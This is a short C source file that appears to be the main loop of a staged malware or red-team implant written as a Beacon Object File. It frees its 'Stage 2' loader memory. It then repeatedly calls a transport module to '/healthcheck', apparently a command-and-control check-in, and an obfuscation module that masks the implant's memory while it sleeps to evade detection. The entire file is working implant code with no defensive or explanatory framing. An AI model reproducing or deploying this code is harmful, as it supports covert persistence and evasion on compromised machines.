#include <windows.h>

WINBASEAPI DECLSPEC_NORETURN VOID WINAPI KERNEL32$ExitThread (DWORD dwExitCode);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

typedef char * (*TRANSPORT_MODULE)   (char * path);
typedef void   (*OBFUSCATION_MODULE) (char * start_addr, int size, int time);

void go(char * stage2ptr, char * implantBase, int implantSize, char * transportModule, char * obfuscationModule) {
    /* let's free our Stage 2 too */
	KERNEL32$VirtualFree(stage2ptr, 0, MEM_RELEASE);

    while(1) {
        ((TRANSPORT_MODULE)   transportModule)   ("/healthcheck");
        ((OBFUSCATION_MODULE) obfuscationModule) (implantBase, implantSize, 1000*10);
    }

	KERNEL32$ExitThread(0);
}